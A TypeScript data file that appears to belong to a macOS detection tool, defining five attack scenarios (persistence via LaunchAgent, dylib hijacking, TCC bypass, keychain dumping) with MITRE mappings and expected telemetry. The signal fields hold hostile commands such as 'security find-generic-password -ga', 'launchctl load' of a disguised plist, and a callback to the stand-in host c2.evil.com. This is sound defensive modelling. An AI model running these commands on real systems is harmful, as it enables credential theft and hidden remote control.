import { AttackScenario, EventCategory } from "../types";

export const ONTOLOGY_CATEGORIES: EventCategory[] = [
  'execution',
  'persistence',
  'file_system',
  'network',
  'privilege',
  'tcc',
  'sip',
  'xprotect',
  'credential_access',
  'discovery'
];

export const PREDEFINED_SCENARIOS: AttackScenario[] = [
  {
    id: 'browser-to-persistence',
    name: 'Browser to Persistence',
    description: 'Models a common initial access vector where a browser download leads to a LaunchAgent for persistence.',
    severity: 'high',
    steps: [
      {
        id: 'step-1',
        order: 1,
        description: 'Safari downloads a suspicious binary to ~/Downloads.',
        mitre_mapping: { tactic: 'Initial Access', technique_id: 'T1566.002', technique_name: 'Phishing: Spearphishing Link' },
        expected_signals: [
          { event_type: 'file_create', category: 'file_system', description: 'File created in Downloads directory', process_name: 'com.apple.Safari' }
        ]
      },
      {
        id: 'step-2',
        order: 2,
        description: 'User executes the binary, which spawns a shell.',
        mitre_mapping: { tactic: 'Execution', technique_id: 'T1059.004', technique_name: 'Command and Scripting Interpreter: Unix Shell' },
        expected_signals: [
          { event_type: 'process_exec', category: 'execution', description: 'Execution of unsigned binary', command_line: './malicious_bin' }
        ]
      },
      {
        id: 'step-3',
        order: 3,
        description: 'Malicious process creates a LaunchAgent for persistence.',
        mitre_mapping: { tactic: 'Persistence', technique_id: 'T1543.001', technique_name: 'Create or Modify System Process: Launch Agent' },
        expected_signals: [
          { event_type: 'file_write', category: 'persistence', description: 'Plist created in ~/Library/LaunchAgents', file_path: '~/Library/LaunchAgents/com.malware.plist' }
        ]
      }
    ]
  },
  {
    id: 'dylib-hijacking',
    name: 'Dylib Hijacking',
    description: 'Exploiting weak dylib loading paths to inject malicious code into a legitimate application.',
    severity: 'critical',
    steps: [
      {
        id: 'step-1',
        order: 1,
        description: 'Attacker identifies a vulnerable application with @rpath vulnerabilities.',
        mitre_mapping: { tactic: 'Discovery', technique_id: 'T1083', technique_name: 'File and Directory Discovery' },
        expected_signals: [
          { event_type: 'process_exec', category: 'execution', description: 'otool or nm used to inspect binary', process_name: 'otool' }
        ]
      },
      {
        id: 'step-2',
        order: 2,
        description: 'Malicious dylib is placed in the expected @rpath location.',
        mitre_mapping: { tactic: 'Persistence', technique_id: 'T1574.002', technique_name: 'Hijack Execution Flow: DLL Side-Loading' },
        expected_signals: [
          { event_type: 'file_create', category: 'file_system', description: 'Dylib dropped in application bundle', file_path: 'Contents/Frameworks/lib.dylib' }
        ]
      },
      {
        id: 'step-3',
        order: 3,
        description: 'Legitimate application loads the malicious dylib on startup.',
        mitre_mapping: { tactic: 'Execution', technique_id: 'T1574.002', technique_name: 'Hijack Execution Flow: DLL Side-Loading' },
        expected_signals: [
          { event_type: 'image_load', category: 'execution', description: 'Malicious dylib loaded by signed process', process_name: 'TargetApp' }
        ]
      }
    ]
  },
  {
    id: 'tcc-bypass-env-var',
    name: 'TCC Bypass via Environment Variables',
    description: 'Attempting to subvert Transparency, Consent, and Control (TCC) by manipulating environment variables like HOME.',
    severity: 'high',
    steps: [
      {
        id: 'step-1',
        order: 1,
        description: 'Process sets a custom HOME environment variable to a world-writable directory.',
        mitre_mapping: { tactic: 'Defense Evasion', technique_id: 'T1564', technique_name: 'Hide Artifacts' },
        expected_signals: [
          { event_type: 'process_exec', category: 'execution', description: 'Exporting HOME variable', command_line: 'export HOME=/tmp/fake_home' }
        ]
      },
      {
        id: 'step-2',
        order: 2,
        description: 'Process attempts to access protected data (e.g., Contacts) using the fake HOME.',
        mitre_mapping: { tactic: 'Privilege Escalation', technique_id: 'T1548', technique_name: 'Abuse Privileges' },
        expected_signals: [
          { event_type: 'file_read', category: 'tcc', description: 'Access to TCC protected database', file_path: '~/Library/Application Support/com.apple.TCC/TCC.db' }
        ]
      }
    ]
  },
  {
    id: 'credential-dumping-security',
    name: 'Credential Dumping via security(1)',
    description: 'Using the built-in security utility to export keychain items or dump passwords.',
    severity: 'critical',
    steps: [
      {
        id: 'step-1',
        order: 1,
        description: 'Attacker uses security find-generic-password to extract secrets.',
        mitre_mapping: { tactic: 'Credential Access', technique_id: 'T1555.001', technique_name: 'Credentials from Password Stores: Keychain' },
        expected_signals: [
          { event_type: 'process_exec', category: 'credential_access', description: 'security find-generic-password execution', process_name: 'security', command_line: 'security find-generic-password -ga' }
        ]
      }
    ]
  },
  {
    id: 'malicious-launchagent-persistence',
    name: 'Malicious LaunchAgent Persistence',
    description: 'A dedicated scenario modeling the creation and execution of a malicious LaunchAgent for persistent access.',
    severity: 'high',
    steps: [
      {
        id: 'step-1',
        order: 1,
        description: 'Attacker drops a malicious payload in a hidden directory.',
        mitre_mapping: { tactic: 'Defense Evasion', technique_id: 'T1564.001', technique_name: 'Hide Artifacts: Hidden Files and Directories' },
        expected_signals: [
          { event_type: 'file_create', category: 'file_system', description: 'Payload dropped in ~/.local/.hidden/bin', file_path: '~/.local/.hidden/bin/updater' }
        ]
      },
      {
        id: 'step-2',
        order: 2,
        description: 'Adversary creates a LaunchAgent plist to execute the payload on user login.',
        mitre_mapping: { tactic: 'Persistence', technique_id: 'T1543.001', technique_name: 'Create or Modify System Process: Launch Agent' },
        expected_signals: [
          { event_type: 'file_write', category: 'persistence', description: 'Malicious plist written to LaunchAgents', file_path: '~/Library/LaunchAgents/com.system.update.plist', command_line: 'touch ~/Library/LaunchAgents/com.system.update.plist' }
        ]
      },
      {
        id: 'step-3',
        order: 3,
        description: 'LaunchAgent is loaded into the user session via launchctl.',
        mitre_mapping: { tactic: 'Persistence', technique_id: 'T1543.001', technique_name: 'Create or Modify System Process: Launch Agent' },
        expected_signals: [
          { event_type: 'process_exec', category: 'execution', description: 'launchctl load command executed', process_name: 'launchctl', command_line: 'launchctl load ~/Library/LaunchAgents/com.system.update.plist' }
        ]
      },
      {
        id: 'step-4',
        order: 4,
        description: 'The malicious agent executes and establishes a callback.',
        mitre_mapping: { tactic: 'Command and Control', technique_id: 'T1071.001', technique_name: 'Application Layer Protocol: Web Protocols' },
        expected_signals: [
          { event_type: 'network_connect', category: 'network', description: 'Outbound connection to C2 server', process_name: 'updater', command_line: './updater --connect c2.evil.com' }
        ]
      }
    ]
  }
];
